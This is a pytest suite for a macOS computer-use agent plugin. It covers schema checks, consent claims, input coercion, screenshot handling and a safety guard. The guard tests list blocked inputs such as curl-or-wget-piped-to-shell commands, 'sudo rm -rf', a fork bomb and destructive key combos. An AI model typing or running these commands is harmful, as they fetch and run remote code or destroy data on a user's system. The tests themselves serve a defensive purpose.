"""Tests for the computer-use plugin.

Ported from hermes-agent ``tests/tools/test_computer_use.py``, adapted to
OpenComputer's ``BaseTool`` / async ``ToolCall`` → ``ToolResult`` contract.

The cua-driver subprocess is never touched — every test forces the
``noop`` backend or injects a fake, so the suite runs on any platform
without the binary installed.
"""

from __future__ import annotations

import asyncio
import base64
import importlib.util
import json
import os
import sys
import time
from pathlib import Path
from unittest.mock import patch

import pytest

from plugin_sdk.consent import ConsentTier
from plugin_sdk.core import ToolCall

PLUGIN_DIR = (
    Path(__file__).resolve().parent.parent.parent
    / "extensions"
    / "computer-use"
)


def _load(module_name: str, path: Path):
    spec = importlib.util.spec_from_file_location(module_name, path)
    assert spec and spec.loader
    mod = importlib.util.module_from_spec(spec)
    sys.modules[module_name] = mod
    spec.loader.exec_module(mod)
    return mod


# cu_tool.py / cu_cua_backend.py import siblings by their (cu_-prefixed)
# module name (the loader puts the plugin root on sys.path[0]). The cu_
# prefix means no other plugin can collide on these names in sys.modules.
# Alias each under its real module name before loading dependents — same
# pattern as test_lsp_bridge_plugin.py.
backend_mod = _load("_cu_test_backend", PLUGIN_DIR / "cu_backend.py")
sys.modules["cu_backend"] = backend_mod
schema_mod = _load("_cu_test_schema", PLUGIN_DIR / "cu_schema.py")
sys.modules["cu_schema"] = schema_mod
# cu_cua_backend.py imports ``find_cua_driver`` from ``cu_installer`` — alias
# it before loading the dependent module.
installer_mod = _load("_cu_test_plugin_installer", PLUGIN_DIR / "cu_installer.py")
sys.modules["cu_installer"] = installer_mod
cua_backend_mod = _load(
    "_cu_test_cua_backend", PLUGIN_DIR / "cu_cua_backend.py"
)
sys.modules["cu_cua_backend"] = cua_backend_mod
tool_mod = _load("_cu_test_tool", PLUGIN_DIR / "cu_tool.py")

CaptureResult = backend_mod.CaptureResult
UIElement = backend_mod.UIElement
ComputerUseTool = tool_mod.ComputerUseTool
COMPUTER_USE_CAPABILITY = tool_mod.COMPUTER_USE_CAPABILITY
COMPUTER_USE_SCHEMA = schema_mod.COMPUTER_USE_SCHEMA


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture(autouse=True)
def _reset_backend():
    """Tear down the cached backend + force the noop backend between tests."""
    tool_mod.reset_backend_for_tests()
    with patch.dict(os.environ, {"OPENCOMPUTER_COMPUTER_USE_BACKEND": "noop"}, clear=False):
        yield
    tool_mod.reset_backend_for_tests()


@pytest.fixture
def noop_backend():
    """Return the active noop backend so tests can inspect recorded calls."""
    return tool_mod._get_backend()


@pytest.fixture
def force_darwin():
    """Pin ``sys.platform`` to ``darwin`` for tests of ``execute``'s post-gate behaviour.

    ``ComputerUseTool.execute`` rejects non-macOS hosts up front with a
    ``computer_use is macOS-only`` error — that gate is covered on its own by
    ``test_execute_is_macos_gated_on_non_darwin``. Everything *behind* the gate
    (input validation, the dangerous-pattern block, dispatch to the backend) is
    platform-independent: the backend is selected purely from
    ``OPENCOMPUTER_COMPUTER_USE_BACKEND`` (forced to ``noop`` by
    ``_reset_backend``), never from ``sys.platform``. A contract test for that
    behaviour must therefore run on every CI host, not only macOS runners —
    without this fixture the suite is red on Linux CI.
    """
    with patch.object(sys, "platform", "darwin"):
        yield


def _run(call: ToolCall):
    """Drive ComputerUseTool.execute synchronously and return the parsed JSON."""
    result = asyncio.run(ComputerUseTool().execute(call))
    return result, json.loads(result.content)


def _call(args: dict, call_id: str = "c1") -> ToolCall:
    return ToolCall(id=call_id, name="computer_use", arguments=args)


def _dispatch(action: str, args: dict | None = None):
    """Run run_computer_use directly (noop backend) — bypasses platform gate."""
    payload = {"action": action, **(args or {})}
    return tool_mod.run_computer_use(payload)


# ---------------------------------------------------------------------------
# Schema
# ---------------------------------------------------------------------------

class TestSchema:
    def test_schema_is_universal_openai_function_format(self):
        assert COMPUTER_USE_SCHEMA["name"] == "computer_use"
        params = COMPUTER_USE_SCHEMA["parameters"]
        assert params["type"] == "object"
        assert "action" in params["properties"]
        assert params["required"] == ["action"]

    def test_schema_does_not_use_anthropic_native_types(self):
        assert COMPUTER_USE_SCHEMA.get("type") != "computer_20251124"
        assert "computer_20251124" not in json.dumps(COMPUTER_USE_SCHEMA)

    def test_schema_supports_element_and_coordinate_targeting(self):
        props = COMPUTER_USE_SCHEMA["parameters"]["properties"]
        assert props["element"]["type"] == "integer"
        assert props["coordinate"]["type"] == "array"

    def test_schema_lists_all_expected_actions(self):
        actions = set(COMPUTER_USE_SCHEMA["parameters"]["properties"]["action"]["enum"])
        assert actions >= {
            "capture", "click", "double_click", "right_click", "middle_click",
            "drag", "scroll", "type", "key", "set_value", "wait", "list_apps",
            "focus_app",
        }

    def test_capture_mode_enum_has_som_vision_ax(self):
        modes = set(COMPUTER_USE_SCHEMA["parameters"]["properties"]["mode"]["enum"])
        assert modes == {"som", "vision", "ax"}

    def test_tool_schema_round_trips_through_basetool(self):
        schema = ComputerUseTool().schema
        assert schema.name == "computer_use"
        # No additionalProperties:false → strict mode must stay off.
        assert ComputerUseTool.strict_mode is False
        assert schema.strict is False

    def test_schema_is_valid_openai_function_schema(self):
        wrapped = {"type": "function", "function": COMPUTER_USE_SCHEMA}
        parsed = json.loads(json.dumps(wrapped))
        assert parsed["function"]["name"] == "computer_use"


# ---------------------------------------------------------------------------
# Consent / capability claim
# ---------------------------------------------------------------------------

class TestCapabilityClaim:
    def test_tool_claims_explicit_consent(self):
        claims = ComputerUseTool.capability_claims
        assert len(claims) == 1
        assert claims[0] is COMPUTER_USE_CAPABILITY
        assert claims[0].tier_required == ConsentTier.EXPLICIT

    def test_capability_id_and_scope(self):
        assert COMPUTER_USE_CAPABILITY.capability_id == (
            "computer_use.macos_desktop_control"
        )
        assert COMPUTER_USE_CAPABILITY.data_scope == "macos:desktop"

    def test_tool_is_not_parallel_safe(self):
        # Desktop actions mutate global UI state — never run concurrently.
        assert ComputerUseTool.parallel_safe is False


# ---------------------------------------------------------------------------
# Dispatch & action routing
# ---------------------------------------------------------------------------

class TestDispatch:
    def test_missing_action_returns_error(self):
        assert "error" in tool_mod.run_computer_use({})

    def test_unknown_action_returns_error(self):
        assert "error" in tool_mod.run_computer_use({"action": "nope"})

    def test_non_string_action_never_raises(self):
        """strict_mode is off, so the API does not enforce ``action`` being a
        string. A model can hand ``run_computer_use`` an int / list / dict /
        float / bool. ``(123 or "").strip()`` would raise a raw
        ``AttributeError`` — and ``run_computer_use`` is a direct entry point
        (tests + any future caller) with no outer ``execute`` wrapper to catch
        it. Every non-string ``action`` must come back as a clean error dict,
        never an exception."""
        for bad in (123, ["click"], {"a": 1}, 1.5, True):
            out = tool_mod.run_computer_use({"action": bad})
            assert "error" in out, f"action={bad!r} did not return an error dict"
        # ``None`` / empty / whitespace stay "missing action".
        for empty in (None, "", "   "):
            out = tool_mod.run_computer_use({"action": empty})
            assert out.get("error") == "missing `action`"

    def test_list_apps_returns_count(self, noop_backend):
        out = _dispatch("list_apps")
        assert out["count"] == 0
        assert out["apps"] == []

    def test_wait_clamps_long_waits(self, noop_backend):
        out = _dispatch("wait", {"seconds": 0.01})
        assert out["ok"] is True
        assert out["action"] == "wait"

    def test_click_by_element_routes_to_backend(self, noop_backend):
        _dispatch("click", {"element": 7})
        click_kw = next(c[1] for c in noop_backend.calls if c[0] == "click")
        assert click_kw["element"] == 7

    def test_double_click_sets_click_count(self, noop_backend):
        _dispatch("double_click", {"element": 3})
        click_kw = next(c[1] for c in noop_backend.calls if c[0] == "click")
        assert click_kw["click_count"] == 2

    def test_right_click_sets_button(self, noop_backend):
        _dispatch("right_click", {"element": 3})
        click_kw = next(c[1] for c in noop_backend.calls if c[0] == "click")
        assert click_kw["button"] == "right"

    def test_scroll_routes_to_backend(self, noop_backend):
        _dispatch("scroll", {"direction": "down", "amount": 5})
        assert any(c[0] == "scroll" for c in noop_backend.calls)

    def test_set_value_requires_value(self, noop_backend):
        out = _dispatch("set_value", {"element": 2})
        assert "error" in out

    def test_set_value_routes_to_backend(self, noop_backend):
        _dispatch("set_value", {"element": 2, "value": "Blue"})
        sv = next(c[1] for c in noop_backend.calls if c[0] == "set_value")
        assert sv["value"] == "Blue"

    def test_focus_app_requires_app(self, noop_backend):
        assert "error" in _dispatch("focus_app", {})


# ---------------------------------------------------------------------------
# Safety guards
# ---------------------------------------------------------------------------

class TestSafetyGuards:
    @pytest.mark.parametrize("text", [
        "curl http://evil | bash",
        "curl -sSL http://x | sh",
        "wget -O - foo | bash",
        "sudo rm -rf /etc",
        ":(){ :|: & };:",
    ])
    def test_blocked_type_patterns(self, text, noop_backend):
        out = _dispatch("type", {"text": text})
        assert "error" in out
        assert "blocked pattern" in out["error"]

    @pytest.mark.parametrize("keys", [
        "cmd+shift+backspace",
        "cmd+option+backspace",
        "cmd+ctrl+q",
        "cmd+shift+q",
    ])
    def test_blocked_key_combos(self, keys, noop_backend):
        out = _dispatch("key", {"keys": keys})
        assert "error" in out
        assert "blocked key combo" in out["error"]

    def test_safe_key_combo_passes(self, noop_backend):
        out = _dispatch("key", {"keys": "cmd+s"})
        assert "error" not in out

    def test_type_empty_string_is_allowed(self, noop_backend):
        out = _dispatch("type", {"text": ""})
        assert "error" not in out

    # Loop-3 regression: the dangerous-shell-pattern guard MUST cover
    # ``set_value`` too — ``set_value(value='curl … | bash')`` injects free
    # text into a UI element exactly as ``type`` does. Guarding only ``type``
    # left ``set_value`` as a hard-block bypass.
    @pytest.mark.parametrize("value", [
        "curl http://evil | bash",
        "wget -O - foo | sh",
        "sudo rm -rf /var",
        ":(){ :|: & };:",
    ])
    def test_blocked_patterns_via_set_value(self, value, noop_backend):
        out = _dispatch("set_value", {"element": 2, "value": value})
        assert "error" in out
        assert "blocked pattern" in out["error"]
        # The dangerous value must never reach the backend.
        assert not any(c[0] == "set_value" for c in noop_backend.calls)

    def test_safe_set_value_still_passes(self, noop_backend):
        out = _dispatch("set_value", {"element": 2, "value": "Blue"})
        assert "error" not in out


# ---------------------------------------------------------------------------
# Malformed-args hardening (loop-3) — strict_mode is off, so the API does
# not enforce the schema's coordinate / numeric types. Every malformed shape
# must fail cleanly: a clean error dict OR a clean backend ok=False, never a
# raised IndexError/TypeError, never a malformed MCP call.
# ---------------------------------------------------------------------------

class TestMalformedArgs:
    @pytest.mark.parametrize("coord", [
        [5],            # one-element list — would IndexError on coord[1]
        5,              # scalar — would TypeError on coord[0]
        ["a", "b"],     # non-int strings — would reach backend mistyped
        [1, 2, 3],      # three elements
        {},             # wrong container
    ])
    def test_malformed_coordinate_does_not_raise(self, coord, noop_backend):
        out = _dispatch("click", {"coordinate": coord})
        assert isinstance(out, dict)
        assert "error" not in out or isinstance(out["error"], str)
        click_kw = next(c[1] for c in noop_backend.calls if c[0] == "click")
        # A malformed coordinate is dropped, never passed mistyped.
        assert click_kw["x"] is None and click_kw["y"] is None

    def test_valid_coordinate_origin_is_honored(self, noop_backend):
        _dispatch("click", {"coordinate": [0, 0]})
        click_kw = next(c[1] for c in noop_backend.calls if c[0] == "click")
        assert click_kw["x"] == 0 and click_kw["y"] == 0

    @pytest.mark.parametrize("coord", [[1], 7, ["x", "y"]])
    def test_malformed_drag_coordinate_does_not_raise(self, coord, noop_backend):
        out = _dispatch("drag", {"from_coordinate": coord, "to_coordinate": coord})
        assert isinstance(out, dict)
        drag_kw = next(c[1] for c in noop_backend.calls if c[0] == "drag")
        assert drag_kw["from_xy"] is None and drag_kw["to_xy"] is None

    def test_malformed_scroll_amount_falls_back(self, noop_backend):
        out = _dispatch("scroll", {"direction": "down", "amount": "lots"})
        assert "error" not in out
        scroll_kw = next(c[1] for c in noop_backend.calls if c[0] == "scroll")
        assert scroll_kw["amount"] == 3

    def test_non_numeric_wait_fails_cleanly(self, noop_backend):
        out = _dispatch("wait", {"seconds": "soon"})
        assert "error" in out
        assert "seconds" in out["error"]

    def test_non_string_app_on_capture_does_not_raise(self, noop_backend):
        out = _dispatch("capture", {"app": 123})
        assert "error" not in out
        cap_kw = next(c[1] for c in noop_backend.calls if c[0] == "capture")
        assert cap_kw["app"] is None

    def test_non_string_app_on_focus_app_fails_cleanly(self, noop_backend):
        out = _dispatch("focus_app", {"app": 123})
        assert "error" in out

    def test_non_string_keys_does_not_raise(self, noop_backend):
        # A non-string ``keys`` must not crash the hard-block check.
        out = _dispatch("key", {"keys": 123})
        assert isinstance(out, dict)
        assert "error" not in out or isinstance(out["error"], str)

    def test_non_string_type_text_does_not_raise(self, noop_backend):
        out = _dispatch("type", {"text": 123})
        assert isinstance(out, dict)
        assert "error" not in out


# ---------------------------------------------------------------------------
# Loop-4: integer ``element`` index coercion. Loop 3 added ``_coerce_xy`` for
# coordinate fields but left the ``integer``-typed ``element`` /
# ``from_element`` / ``to_element`` fields un-coerced — strict_mode is off,
# so a model can hand a string/float/list and it would reach cua-driver's
# strict ``integer`` MCP arg mistyped. These confirm coercion at every site.
# ---------------------------------------------------------------------------

class TestElementCoercion:
    @pytest.mark.parametrize("raw,expected", [
        ("14", 14), (14, 14), (14.0, 14), ("  9 ", 9),
        (None, None), ("nope", None), (14.5, None), ([14], None),
        (True, None), (False, None),
    ])
    def test_coerce_element_normalises(self, raw, expected):
        assert tool_mod._coerce_element(raw) == expected

    def test_click_coerces_string_element(self, noop_backend):
        out = _dispatch("click", {"element": "14"})
        assert "error" not in out
        click_kw = next(c[1] for c in noop_backend.calls if c[0] == "click")
        assert click_kw["element"] == 14 and isinstance(click_kw["element"], int)

    def test_click_drops_unparseable_element(self, noop_backend):
        _dispatch("click", {"element": "abc"})
        click_kw = next(c[1] for c in noop_backend.calls if c[0] == "click")
        assert click_kw["element"] is None

    def test_scroll_coerces_float_element(self, noop_backend):
        _dispatch("scroll", {"direction": "down", "element": 12.0})
        scroll_kw = next(c[1] for c in noop_backend.calls if c[0] == "scroll")
        assert scroll_kw["element"] == 12 and isinstance(scroll_kw["element"], int)

    def test_set_value_coerces_string_element(self, noop_backend):
        _dispatch("set_value", {"value": "Blue", "element": "7"})
        sv_kw = next(c[1] for c in noop_backend.calls if c[0] == "set_value")
        assert sv_kw["element"] == 7 and isinstance(sv_kw["element"], int)

    def test_drag_coerces_both_element_indices(self, noop_backend):
        _dispatch("drag", {"from_element": "3", "to_element": 5.0})
        drag_kw = next(c[1] for c in noop_backend.calls if c[0] == "drag")
        assert drag_kw["from_element"] == 3
        assert drag_kw["to_element"] == 5

    def test_bool_element_is_not_an_index(self, noop_backend):
        # ``isinstance(True, int)`` holds — but True is not element 1.
        _dispatch("click", {"element": True})
        click_kw = next(c[1] for c in noop_backend.calls if c[0] == "click")
        assert click_kw["element"] is None


# ---------------------------------------------------------------------------
# Loop-4: documentation-vs-behaviour. The schema/docs must describe what the
# cua-driver 0.1.9 backend actually does — coordinate space, SOM overlays.
# ---------------------------------------------------------------------------

class TestSchemaContractTruth:
    def test_coordinate_space_is_screenshot_pixels_not_logical(self):
        """The schema must NOT promise logical screen space — cua-driver's
        click/drag x,y are window-local screenshot pixels."""
        desc = COMPUTER_USE_SCHEMA["parameters"]["properties"]["coordinate"]["description"]
        low = desc.lower()
        assert "screenshot" in low
        assert "logical screen space" not in low

    def test_drag_coordinate_descriptions_name_screenshot_space(self):
        props = COMPUTER_USE_SCHEMA["parameters"]["properties"]
        for field in ("from_coordinate", "to_coordinate"):
            assert "screenshot" in props[field]["description"].lower()

    def test_som_mode_does_not_claim_drawn_overlays(self):
        """cua-driver 0.1.9 returns a plain screenshot — the plugin draws no
        overlays. The mode description must not claim numbered overlays."""
        desc = COMPUTER_USE_SCHEMA["parameters"]["properties"]["mode"]["description"]
        assert "numbered overlays" not in desc.lower()
        assert "indexed list" in desc.lower() or "element list" in desc.lower()

    def test_tool_description_does_not_claim_overlays(self):
        desc = COMPUTER_USE_SCHEMA["description"].lower()
        assert "overlay" not in desc

    def test_plugin_json_does_not_claim_drawn_overlays(self):
        """The plugin.json discovery metadata (what `oc plugins` shows) must
        not claim numbered element overlays — cua-driver 0.1.9 returns a
        plain screenshot and the plugin draws nothing onto it. This is the
        same truth the schema/README/SKILL all carry; plugin.json drifted
        from it once (loop 12) with no test covering this surface."""
        import json
        from pathlib import Path
        plugin_json = (Path(__file__).resolve().parents[2]
                       / "extensions" / "computer-use" / "plugin.json")
        meta = json.loads(plugin_json.read_text())
        desc = meta["description"].lower()
        assert "numbered element overlay" not in desc
        assert "numbered overlay" not in desc


# ---------------------------------------------------------------------------
# Capture → screenshot persistence
# ---------------------------------------------------------------------------

class _FakeBackend:
    """Fake backend that returns a capture with a real (tiny) PNG."""

    FAKE_PNG = (
        "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk"
        "YAAAAAYAAjCB0C8AAAAASUVORK5CYII="
    )

    def __init__(self, elements=None):
        self._elements = elements or []

    def start(self): ...
    def stop(self): ...
    def is_available(self): return True

    def capture(self, mode="som", app=None):
        return CaptureResult(
            mode=mode, width=1024, height=768,
            png_b64=self.FAKE_PNG, elements=self._elements,
            app="Safari", window_title="example.com", png_bytes_len=100,
        )

    def click(self, **kw): return backend_mod.ActionResult(ok=True, action="click")
    def drag(self, **kw): return backend_mod.ActionResult(ok=True, action="drag")
    def scroll(self, **kw): return backend_mod.ActionResult(ok=True, action="scroll")
    def type_text(self, text): return backend_mod.ActionResult(ok=True, action="type")
    def key(self, keys): return backend_mod.ActionResult(ok=True, action="key")
    def list_apps(self): return []
    def focus_app(self, app, raise_window=False):
        return backend_mod.ActionResult(ok=True, action="focus_app")


class TestCaptureResponse:
    def test_capture_ax_mode_returns_json_no_image(self, noop_backend):
        out = _dispatch("capture", {"mode": "ax"})
        assert out["mode"] == "ax"
        # noop backend returns no PNG; ax mode never persists an image.
        assert "screenshot_path" not in out

    def test_capture_bad_mode_returns_error(self, noop_backend):
        assert "error" in _dispatch("capture", {"mode": "bogus"})

    def test_capture_vision_persists_screenshot_to_disk(self, tmp_path):
        tool_mod.reset_backend_for_tests()
        with patch.dict(os.environ, {"OPENCOMPUTER_PROFILE_HOME": str(tmp_path)}), \
             patch.object(tool_mod, "_get_backend", return_value=_FakeBackend()):
            out = tool_mod.run_computer_use({"action": "capture", "mode": "vision"})
        assert "screenshot_path" in out
        path = Path(out["screenshot_path"])
        assert path.exists()
        assert path.read_bytes()  # non-empty
        assert "MEDIA:" in out["share_hint"]

    def test_capture_som_formats_element_index(self, tmp_path):
        elements = [
            UIElement(index=1, role="AXButton", label="Back", bounds=(10, 20, 30, 30)),
            UIElement(index=2, role="AXTextField", label="Search", bounds=(50, 20, 200, 30)),
        ]
        tool_mod.reset_backend_for_tests()
        with patch.dict(os.environ, {"OPENCOMPUTER_PROFILE_HOME": str(tmp_path)}), \
             patch.object(tool_mod, "_get_backend",
                          return_value=_FakeBackend(elements=elements)):
            out = tool_mod.run_computer_use({"action": "capture", "mode": "som"})
        assert "#1" in out["summary"]
        assert "AXButton" in out["summary"]
        assert out["elements"][1]["role"] == "AXTextField"

    def test_summary_omits_zero_sentinel_bounds(self, tmp_path):
        """The cua-driver backend's AX tree carries no per-element bounds —
        the (0,0,0,0) sentinel must not be rendered as a real ``@`` position."""
        elements = [
            UIElement(index=1, role="AXButton", label="Back"),  # bounds=(0,0,0,0)
            UIElement(index=2, role="AXLink", label="Home", bounds=(5, 6, 7, 8)),
        ]
        tool_mod.reset_backend_for_tests()
        with patch.dict(os.environ, {"OPENCOMPUTER_PROFILE_HOME": str(tmp_path)}), \
             patch.object(tool_mod, "_get_backend",
                          return_value=_FakeBackend(elements=elements)):
            out = tool_mod.run_computer_use({"action": "capture", "mode": "som"})
        assert "(0, 0, 0, 0)" not in out["summary"]
        assert "@ (5, 6, 7, 8)" in out["summary"]  # real bounds still shown

    def test_capture_after_includes_follow_up_capture(self, tmp_path):
        tool_mod.reset_backend_for_tests()
        with patch.dict(os.environ, {"OPENCOMPUTER_PROFILE_HOME": str(tmp_path)}), \
             patch.object(tool_mod, "_get_backend", return_value=_FakeBackend()):
            out = tool_mod.run_computer_use(
                {"action": "click", "element": 1, "capture_after": True}
            )
        # Combined payload carries both the action result + the capture.
        assert out["action"] == "click"
        assert out["ok"] is True
        assert "screenshot_path" in out

    def test_capture_after_uses_recapture_active_when_available(self, tmp_path):
        """Audit loop 9, found live: the ``capture_after`` follow-up MUST
        re-capture the EXACT window the action just touched (the sticky
        pid/window_id), not whatever is frontmost. A plain
        ``backend.capture(mode='som')`` re-runs frontmost-first window
        selection — so a ``type``+``capture_after`` against a backgrounded
        app silently came back showing the frontmost window. The tool layer
        must prefer the backend's ``recapture_active`` extension."""
        class _RecaptureBackend(_FakeBackend):
            def __init__(self):
                super().__init__()
                self.frontmost_captures = 0
                self.sticky_captures = 0

            def capture(self, mode="som", app=None):
                self.frontmost_captures += 1
                return super().capture(mode=mode, app=app)

            def recapture_active(self, mode="som"):
                self.sticky_captures += 1
                return CaptureResult(
                    mode=mode, width=10, height=10, png_b64=None,
                    elements=[], app="TextEdit",
                    window_title="Untitled (sticky)", png_bytes_len=0)

        backend = _RecaptureBackend()
        tool_mod.reset_backend_for_tests()
        with patch.dict(os.environ, {"OPENCOMPUTER_PROFILE_HOME": str(tmp_path)}), \
             patch.object(tool_mod, "_get_backend", return_value=backend):
            out = tool_mod.run_computer_use(
                {"action": "type", "text": "x", "capture_after": True})
        # The follow-up went through recapture_active — the sticky window —
        # NOT the frontmost-first capture().
        assert backend.sticky_captures == 1
        assert backend.frontmost_captures == 0
        assert out["window_title"] == "Untitled (sticky)"
        assert out["action"] == "type"

    def test_capture_after_falls_back_when_no_recapture_active(self, tmp_path):
        """A backend without ``recapture_active`` (the NoopBackend, a future
        backend) must still get a follow-up capture — the tool falls back to
        the plain frontmost ``capture``."""
        tool_mod.reset_backend_for_tests()
        backend = _FakeBackend()  # no recapture_active attribute
        assert not hasattr(backend, "recapture_active")
        with patch.dict(os.environ, {"OPENCOMPUTER_PROFILE_HOME": str(tmp_path)}), \
             patch.object(tool_mod, "_get_backend", return_value=backend):
            out = tool_mod.run_computer_use(
                {"action": "click", "element": 1, "capture_after": True})
        assert out["action"] == "click"
        assert "window_title" in out  # the fallback capture still ran


class TestScreenshotPersistence:
    """Disk-write behaviour for capture PNG/JPEG persistence."""

    def test_cleanup_prunes_both_png_and_jpg(self, tmp_path):
        """The 24h prune must reap JPEG captures too — _persist_png writes
        .jpg when cua-driver returns JPEG bytes."""
        old = time.time() - 48 * 3600
        fresh = time.time()
        for name, mtime in [
            ("computer_use_a.png", old), ("computer_use_b.jpg", old),
            ("computer_use_c.png", fresh), ("computer_use_d.jpg", fresh),
        ]:
            p = tmp_path / name
            p.write_bytes(b"x")
            os.utime(p, (mtime, mtime))
        tool_mod._cleanup_old_screenshots(tmp_path)
        survivors = {p.name for p in tmp_path.iterdir()}
        assert survivors == {"computer_use_c.png", "computer_use_d.jpg"}

    def test_persist_png_detects_jpeg_magic_bytes(self, tmp_path):
        """JPEG bytes (FF D8 FF) must persist with a .jpg extension."""
        jpeg = base64.b64encode(b"\xff\xd8\xff\xe0rest").decode()
        with patch.dict(os.environ, {"OPENCOMPUTER_PROFILE_HOME": str(tmp_path)}):
            path = tool_mod._persist_png(jpeg)
        assert path is not None and path.endswith(".jpg")

    def test_persist_png_degrades_when_dir_uncreatable(self, tmp_path):
        """An uncreatable cache dir must yield None — never raise and kill
        the whole capture payload."""
        # Point the profile home at a path whose parent is a file → mkdir fails.
        blocker = tmp_path / "not_a_dir"
        blocker.write_bytes(b"x")
        with patch.dict(os.environ,
                        {"OPENCOMPUTER_PROFILE_HOME": str(blocker)}):
            assert tool_mod._screenshots_dir() is None
            assert tool_mod._persist_png(_FakeBackend.FAKE_PNG) is None

    def test_capture_payload_survives_unwritable_cache(self, tmp_path):
        """A capture whose screenshot can't be persisted still returns the
        element payload — just without screenshot_path."""
        blocker = tmp_path / "blocked"
        blocker.write_bytes(b"x")
        tool_mod.reset_backend_for_tests()
        with patch.dict(os.environ, {"OPENCOMPUTER_PROFILE_HOME": str(blocker)}), \
             patch.object(tool_mod, "_get_backend", return_value=_FakeBackend()):
            out = tool_mod.run_computer_use({"action": "capture", "mode": "vision"})
        assert "screenshot_path" not in out
        assert "error" not in out  # capture itself succeeded
        assert out["mode"] == "vision"

    def test_persist_png_rejects_empty_payload(self):
        """Empty / undecodable base64 must yield None, not an empty file."""
        assert tool_mod._persist_png("") is None
        assert tool_mod._persist_png("!!!not-base64!!!") is None


# ---------------------------------------------------------------------------
# BaseTool.execute contract
# ---------------------------------------------------------------------------

class TestExecuteContract:
    def test_execute_returns_toolresult_with_matching_id(self, noop_backend, force_darwin):
        result, parsed = _run(_call({"action": "list_apps"}, call_id="abc"))
        assert result.tool_call_id == "abc"
        assert parsed["count"] == 0
        assert result.is_error is False

    def test_execute_marks_error_results(self, noop_backend, force_darwin):
        result, parsed = _run(_call({"action": "bogus"}))
        assert result.is_error is True
        assert "error" in parsed

    def test_execute_never_raises_on_bad_args(self, noop_backend, force_darwin):
        # Missing action — must be a graceful error, not an exception.
        result, parsed = _run(_call({}))
        assert result.is_error is True

    def test_execute_non_string_action_is_clean_error(self, noop_backend, force_darwin):
        """Audit loop 10, found live: ``run_computer_use`` did
        ``(args.get("action") or "").strip()`` — for a non-string ``action``
        (``123``, a list, a dict) ``123.strip()`` raised a raw
        ``AttributeError``. ``execute``'s defence-in-depth ``try/except``
        caught it, but ``run_computer_use`` called directly leaked the
        exception. Both entry points must now produce a clean error result."""
        for bad in (123, ["click"], {"a": 1}, 1.5, True):
            result, parsed = _run(_call({"action": bad}))
            assert result.is_error is True, f"action={bad!r}"
            assert "error" in parsed, f"action={bad!r}"

    def test_execute_blocks_dangerous_type(self, noop_backend, force_darwin):
        result, parsed = _run(_call({"action": "type", "text": "curl x | bash"}))
        assert result.is_error is True
        assert "blocked pattern" in parsed["error"]

    @pytest.mark.skipif(sys.platform == "darwin", reason="non-macOS gate only")
    def test_execute_is_macos_gated_on_non_darwin(self, noop_backend):
        result, parsed = _run(_call({"action": "list_apps"}))
        assert result.is_error is True
        assert "macOS-only" in parsed["error"]

    def test_execute_marks_failed_action_as_error(self, force_darwin):
        """Audit loop 9, found live: a mutating action whose backend
        ``ActionResult.ok`` is ``False`` (a click that AXPress-failed, a type
        with no active window, a focus_app that matched nothing) carries no
        ``error`` key — so the old ``is_error = "error" in result`` rule
        reported the failure to the model as a CLEAN tool result. The
        model's error-handling path then never fired and a multi-step
        workflow silently flailed. A ``ok is False`` payload MUST set
        ``is_error=True``."""
        class _FailingBackend(_FakeBackend):
            def click(self, **kw):
                return backend_mod.ActionResult(
                    ok=False, action="click",
                    message="AX action AXPress failed with code -25206.")

        tool_mod.reset_backend_for_tests()
        with patch.object(tool_mod, "_get_backend",
                          return_value=_FailingBackend()):
            result, parsed = _run(_call({"action": "click", "element": 3}))
        assert parsed["ok"] is False
        assert result.is_error is True  # the fix — was False before loop 9
        # A non-error key is not present; the model reads ``ok`` + ``message``.
        assert "error" not in parsed
        assert "AXPress" in parsed["message"]

    def test_execute_marks_successful_action_not_error(self, force_darwin):
        """The mirror of the above — a clean ``ok=True`` action must NOT be
        flagged as an error, or every successful click would look failed."""
        tool_mod.reset_backend_for_tests()
        with patch.object(tool_mod, "_get_backend", return_value=_FakeBackend()):
            result, parsed = _run(_call({"action": "click", "element": 1}))
        assert parsed["ok"] is True
        assert result.is_error is False

    def test_backend_unavailable_error_never_empty(self, force_darwin):
        """Audit loop 9, found live: when the backend fails to start with an
        empty-string exception (a closed stdio pipe, a bare anyio error),
        ``f"backend unavailable: {e}"`` left the model an unactionable
        "backend unavailable: " with nothing after the colon. The handler
        must fall back to ``repr``."""
        from anyio import ClosedResourceError

        tool_mod.reset_backend_for_tests()
        with patch.object(tool_mod, "_get_backend",
                          side_effect=ClosedResourceError()):
            result, parsed = _run(_call({"action": "capture"}))
        assert result.is_error is True
        assert parsed["error"].strip() != "computer_use backend unavailable:"
        assert "ClosedResourceError" in parsed["error"]

    def test_failed_backend_start_is_not_cached(self):
        """Audit loop 11, found live: ``_get_backend`` assigned the backend to
        the module global BEFORE calling ``start()``. A transient ``start()``
        failure (slow ``cua-driver mcp`` init overrunning the 15s timeout, a
        daemon hiccup) then left a half-started backend wedged in the cache —
        every later call returned that dead instance ("session not started")
        with no recovery short of a process restart. The fix caches only
        after ``start()`` succeeds; a failed start must leave the global
        ``None`` so the next call retries cleanly."""
        tool_mod.reset_backend_for_tests()

        started: list[object] = []

        class _FlakyBackend:
            """First instance's start() raises; a fresh instance succeeds."""
            _attempt = 0

            def __init__(self) -> None:
                _FlakyBackend._attempt += 1
                self._attempt_no = _FlakyBackend._attempt

            def start(self) -> None:
                if self._attempt_no == 1:
                    raise TimeoutError("mcp session start timed out")
                started.append(self)

            def stop(self) -> None:
                pass

        _FlakyBackend._attempt = 0
        with patch.object(tool_mod, "NoopBackend", _FlakyBackend):
            # First call: start() raises — must propagate AND not cache.
            with pytest.raises(TimeoutError):
                tool_mod._get_backend()
            assert tool_mod._backend is None, \
                "a backend whose start() failed must NOT be cached"
            # Second call: a fresh backend starts cleanly and IS cached.
            b = tool_mod._get_backend()
            assert b is not None
            assert tool_mod._backend is b
            assert b in started
        tool_mod.reset_backend_for_tests()


# ---------------------------------------------------------------------------
# Backend availability gating
# ---------------------------------------------------------------------------

class TestAvailability:
    def test_is_available_false_on_non_macos(self):
        if sys.platform != "darwin":
            assert ComputerUseTool.is_available() is False

    def test_noop_backend_is_available(self, noop_backend):
        assert noop_backend.is_available() is True


# ---------------------------------------------------------------------------
# cua-driver backend helpers (no subprocess — pure parsing)
# ---------------------------------------------------------------------------

class TestCuaBackendParsing:
    def test_parse_key_combo_splits_modifiers(self):
        key, mods = cua_backend_mod._parse_key_combo("cmd+shift+s")
        assert key == "s"
